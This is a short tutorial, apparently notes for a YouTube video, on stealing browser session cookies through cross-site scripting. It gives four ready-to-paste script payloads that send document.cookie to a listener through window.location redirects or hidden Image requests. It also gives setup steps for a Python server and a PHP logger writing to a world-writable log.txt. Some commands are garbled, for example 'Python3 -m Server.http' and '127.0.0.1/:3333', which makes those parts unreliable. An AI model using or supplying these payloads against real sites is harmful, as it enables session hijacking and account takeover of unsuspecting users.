# Stealling Cookies

All Payload that used from this Youtube Video

https://youtu.be/Kh1sgI5yLdk


# Takeing The Cookie From Python3 Server Listener

1 - Strat Python Server:

YasserREED > Python3 -m Server.http 3333 <- Any Port You Like!

2 - write Payload with window.location() function:

<script> window.location='http://127.0.0.1/:3333?cookie='+document.cookie </script> 

# Send Cookies without go to another window

1 - Start Python3 Server:

YasserREED> Python3 -m Server.http 3333 <- Any Port You Like!

2 - Write the Pyaload:

<script>
    var i = new Image();
    i.src="http://127.0.0.1:3333/?cookie="+document.cookie
</script>  


# Wirte PHP Code To Take the Cookie

1 - Go to html File:

[~] YasserREED> cd  /var/www/html

2 - Make File get.php:

YasserREED> sudo gedit get.php

// Code with the File Just Copy it 

3 - Make log.txt file:

YasserRED> sudo touch log.txt

4 - Give all Privileges:

YasserREED> sudo chmod 777 log.txt

# Send The Cookie to log.txt by get.php using window.location()

1 - Write The Payload:

<script> window.location='https://127.0.0.1/get.php?cookie='+document.cookie </script> 

2 - Paste into input filed.

3 - Check log.txt. //if not showen you can refresh the page 🔄

# Take the cookie Silence by get.php and send it to log.txt

1 - Write Payload:

<script>
    var o = new Image();
    o.src="http://127.0.0.1/get.php?cookie="+document.cookie
</script>


2 - Paste into input filed.

3 - Check log.txt //if not showen you can refresh the page 🔄

